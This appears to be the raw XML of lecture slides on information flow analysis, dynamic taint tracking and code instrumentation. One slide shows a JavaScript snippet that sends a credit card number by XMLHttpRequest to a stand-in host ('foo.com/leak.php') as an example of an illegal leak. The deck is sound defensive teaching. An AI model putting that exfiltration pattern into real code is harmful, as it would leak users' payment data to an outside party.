          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1673612" y="4617033"/>
            <a:ext cx="74058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This is an illegal information flow! </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Sensitive information is leaking.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="160595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2B56E1-FD38-0940-91C5-25C145CE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F5D86E-399D-3F45-B931-A21746344702}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="826718" y="1402915"/>
            <a:ext cx="64258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urier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t> n = '</a:t>
            </a:r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ccn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>’; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t> s = "Credit card number is: " + n; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>var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dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>xhr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t> = new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>XMLHttpRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>();  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>xhr.open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>('GET', '//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>foo.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>leak.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>');  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>xhr.send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>(s);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2472A-A889-8444-8E4C-BA34410C74F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206906" y="434340"/>
            <a:ext cx="4405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Information Flow Analysis</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Oval Callout 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0C2B4298-C9F2-6C40-A2C5-E4CA63F8A9A1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6601216" y="3356975"/>
            <a:ext cx="2354894" cy="1590806"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeEllipseCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -89450"/>
              <a:gd name="adj2" fmla="val -595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Explicit Flows</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" b="1" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>(Direct Flows)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="132828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8FBA7E-795E-1E4F-8AC1-8E3F5F670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370389-D7D9-1E40-B18E-854E053E6790}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="536187" y="1414413"/>
            <a:ext cx="96114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ourier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>h = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>readsecret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>();     // h is secret (high security)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>if (h == 1234)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>    l = 1;            // l is public (low security)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>else</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>    l = 0;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7589A-C34B-644A-8562-3F1A7712676B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="583280" y="4879918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Even though you never printed h, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>you leaked information about h through l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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484864-7474-0144-AFB7-8D19CA9C78FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2184080" y="3791566"/>
            <a:ext cx="33522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If l == 1, they know h == 1234.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15C6A5-78DE-DB4B-B416-2564A8AB47D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2184080" y="4335742"/>
            <a:ext cx="31838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If l == 0, they know h != 1234.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Cloud Callout 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{54B99EF6-385B-274A-9576-7C48A3FC76BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7766137" y="3670126"/>
            <a:ext cx="1903956" cy="864296"/>
          </a:xfrm>
          <a:prstGeom prst="cloudCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -78973"/>
              <a:gd name="adj2" fmla="val 832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Implicit Flows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8826C-98C2-4641-B1C0-E50A1FF7CF8C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4937607" y="537792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Implicit Flow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> happens when </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>sensitive data influences control flow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F31F6-4A16-644D-8817-3AF499B84FAB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206906" y="434340"/>
            <a:ext cx="4405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Information Flow Analysis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013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55328-8D12-C94C-8D04-E959729BD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84C6C4-DA6E-FD4E-9B27-7EBEACEE9484}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="848421" y="1543543"/>
            <a:ext cx="78495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h := </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>readsecret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>();   // h is secret (high security)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>l := 1;              // l is public (low security)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while (h &lt; 100) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>    h := h + 1;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>    l := l * 2;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DD48F8-5A5A-784D-9048-C4DEC989F917}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="206906" y="434340"/>
            <a:ext cx="4405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Information Flow Analysis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7770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CB81B0-E837-434F-BA4C-113DB481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6E380B-AFB3-E54B-B521-1DF025788130}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1517495" y="1829911"/>
            <a:ext cx="68519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Runtime technique used to track the flow of untrusted input (called </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tainted data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>) through a program.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A5DFE0-E29C-6B45-A2DD-700D9F6DAF04}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1517494" y="3141070"/>
            <a:ext cx="75727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It marks (or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>taints</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>) inputs from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>suspicious sources </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>(e.g., user input, network, file) and propagates this taint through the program as the data is used or modified.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CE92DD-79CD-574F-97EF-C90E9E5D534C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1517495" y="4729228"/>
            <a:ext cx="7707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If tainted data reaches a sensitive operation (called a sink), the program can either raise an alert, block it, or sanitize it.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8C408B-BD7B-4E45-A8B2-460B8190AAE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="204092" y="434227"/>
            <a:ext cx="40206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Dynamic Taint Tracking</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="114731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CB81B0-E837-434F-BA4C-113DB481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8C408B-BD7B-4E45-A8B2-460B8190AAE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="204092" y="434227"/>
            <a:ext cx="61446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Workflow of Dynamic Taint Tracking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B582D8-F7D3-554B-BBA2-E26FD68704C1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="799907" y="1410849"/>
            <a:ext cx="4953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Identify </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>taint sources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956035-8C6C-634F-956C-B60A82BC5FFA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="799906" y="2048917"/>
            <a:ext cx="45736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Taint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> the data read from these sources.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9EB98C-F075-8949-8FD8-3540C9365BF1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="681038" y="3818414"/>
          <a:ext cx="8543925" cy="365760"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="8543925">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="39461884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808398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39DDA84-283F-AD4D-948F-665801B49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663111"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="799906" y="2739538"/>
          <a:ext cx="8543925" cy="640080"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="8543925">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10714373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As the program runs, propagate taint labels during operations (assignments, function calls, etc.).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5229974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53B2823-C316-9A41-BBB2-EF2065F7DA4A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="799906" y="3654526"/>
            <a:ext cx="84250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Check if </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tainted data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>reaches </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sensitive sinks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276AAB-B673-5A45-9C83-A4AC0381A4C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="799906" y="4438304"/>
            <a:ext cx="70059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Raise a warning or block execution if unsafe behavior is detected.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="207566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E62D83-2DE0-5048-85BC-2D8608C6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BBF7D6-3284-A646-89D7-DCB6C22E683C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1450586" y="1383861"/>
            <a:ext cx="628835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Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>a = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>taint_input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>("Enter: ")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>b = a + "safe"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>c = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>b.upper</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>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AEC858-6052-E049-92C6-201543BAF9BB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1651309" y="3593107"/>
            <a:ext cx="70243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Taint Tracking </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>helps ensure that only sanitized, trusted data is passed into sensitive contexts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C3E73-E515-B240-AD82-2403BD5487DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1651309" y="4463524"/>
            <a:ext cx="75736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By instrumenting your code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dynamic taint tracking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>, you gain the ability to a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>utomatically detect and mitigate vulnerabilities </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>without having to manually inspect every line of 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5CCFCA-2590-6D45-A8B2-EF2C786AF825}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="204092" y="434227"/>
            <a:ext cx="40206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Dynamic Taint Tracking</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="182293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E55BAB-D18C-674D-BF33-61A186C5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098DD9-A4CE-5D44-82E0-2BF5F02F1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925" y="3044763"/>
            <a:ext cx="7311602" cy="27195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F9AA587-AEE0-844B-BBFE-CB4593E762F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1026841" y="1433152"/>
            <a:ext cx="66451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Inserting extra code into a program to observe its behavior during execution.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D69D97-98E0-3441-8325-A7293EF9531F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1026841" y="2432366"/>
            <a:ext cx="7358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Modify the program so it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
              <a:t>tells us what it is doing while it runs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1EBF39-0C9F-794E-938B-2BFEA7096D5E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="204092" y="434227"/>
            <a:ext cx="37561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Code Instrumentation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="407033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7631A6-B465-3840-A2FB-732C836C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C791AF-8B6B-3B44-88F8-8EBF1639FB81}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="204092" y="434227"/>
            <a:ext cx="37561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Code Instrumentation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E74640-E53C-AB4F-B590-CDE387D287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0" t="14301" r="5790" b="12982"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="693295" y="3524641"/>
            <a:ext cx="8721971" cy="2715065"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Bent Arrow 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D98875F4-3479-3E4F-AA3B-EFB41F902996}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="7423232" y="2440690"/>
            <a:ext cx="1530247" cy="677167"/>
          </a:xfrm>
          <a:prstGeom prst="bentArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 25000"/>
              <a:gd name="adj2" fmla="val 25267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67FBE1-0FEA-CD43-A377-C17FF056B5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4" t="15595" r="5483" b="14280"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3067707" y="1189445"/>
            <a:ext cx="4782065" cy="197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16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668923-4ED2-7A4C-9486-1D8624B0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590086-6293-A54B-8522-CA353C9C5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0" y="1714500"/>
            <a:ext cx="660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47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3343860</TotalTime>
  <Words>989</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>A4 Paper (210x297 mm)</PresentationFormat>
  <Paragraphs>141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Adobe Gothic Std B</vt:lpstr>
      <vt:lpstr>Arial MT</vt:lpstr>
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>等线 Light</vt:lpstr>
      <vt:lpstr>SimSun</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Comic Sans MS</vt:lpstr>
      <vt:lpstr>Courier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Zubair Ahmad</cp:lastModifiedBy>
  <cp:revision>839</cp:revision>
  <cp:lastPrinted>2025-01-23T10:52:12Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2018-07-17T04:46:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-04-14T10:11:27Z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